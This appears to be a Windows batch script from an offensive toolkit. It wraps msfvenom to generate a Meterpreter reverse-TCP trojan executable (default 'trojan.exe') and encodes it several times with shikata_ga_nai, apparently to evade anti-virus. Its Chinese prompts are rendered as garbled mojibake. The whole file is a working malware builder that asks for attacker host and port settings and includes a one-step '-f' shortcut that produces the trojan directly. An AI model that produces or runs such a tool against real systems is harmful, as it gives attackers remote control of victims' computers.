echo ����ľ�����ɳ���
set void=

if "%1"=="-f" (if "%2"=="%void%" (echo LHOST���ô���&@goto exit) else (call %bin%\msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=%2 LPORT=2345 -b "\x00" -e x86/shikata_ga_nai -i 5 -f exe -o %kalindows%/trojan.exe&@goto exit))

:payload
set payload=windows/meterpreter/reverse_tcp
set /p payload=������payload(Ĭ��Ϊwindows/meterpreter/reverse_tcp):
if "%payload%"=="exit" (@goto exit)

:lhost
ipconfig
set /p LHOST=������LHOST:
if "%LHOST%"=="%void%" (@goto lhost)
if "%LHOST%"=="exit" (@goto exit)

:lport
set LPORT=4444
set /p LPORT=������LPORT(Ĭ��Ϊ2345):
if "%LPORT%"=="exit" (@goto exit)

:format
set format=exe
set /p format=�������ʽ(Ĭ��Ϊexe):
if "%format%"=="exit" (@goto exit)

:output
set output=%kalindows%
set /p output=���������Ŀ¼(Ĭ��ΪKalindows��Ŀ¼):
if "%output%"=="exit" (@goto exit)

:filename
set filename=trojan.exe
set /p filename=�������ļ���(Ĭ��Ϊtrojan.exe):
if "%filename%"=="exit" (@goto exit)

:incoder
set incoder=x86/shikata_ga_nai
set /p incoder=��������ɱģ��(Ĭ��Ϊx86/shikata_ga_nai):
if "%incoder%"=="exit" (@goto exit)

:times
set times=8
set /p times=��������ɱ����(Ĭ��Ϊ8):
if "%times%"=="exit" (@goto exit)

:generate
echo �������ɣ������ͷſ�
call %bin%\msfvenom -p %payload% LHOST=%LHOST% LPORT=%LPORT% -b "\x00" -e %incoder% -i %times% -f %format% -o %output%/%filename%
if exist "%output%/%filename%" (echo �ɹ����ļ��ѱ�����%output%/%filename%) else (echo �������������Ƿ���ȷ)

:exit